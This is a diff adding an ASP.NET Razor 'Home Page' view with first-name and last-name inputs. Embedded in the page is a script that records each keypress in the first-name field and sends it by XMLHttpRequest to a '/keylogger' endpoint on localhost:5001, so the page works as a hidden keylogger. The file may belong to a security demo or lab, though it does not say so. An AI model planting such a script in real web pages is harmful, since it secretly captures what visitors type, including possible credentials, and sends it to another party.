@@ -1,0 +1,18 @@
+﻿@{
+    ViewData["Title"] = "Home Page";
+}
+
+<div class="text-center">
+
+    <div>@ViewData["username"]</div>
+    <input id="firstName" type="text"/>
+    <input id="lastName" type="text"/>
+    
+    <script>
+    function sendKeyPress(e) { 
+        var x = new XMLHttpRequest();x.open("GET","http://localhost:5001/keylogger?key="+e,true);x.send(); 
+    }
+        var elem=document.querySelector("#firstName");
+        elem.addEventListener("keypress",function(e){sendKeyPress(e.key)});
+    </script>
+</div>
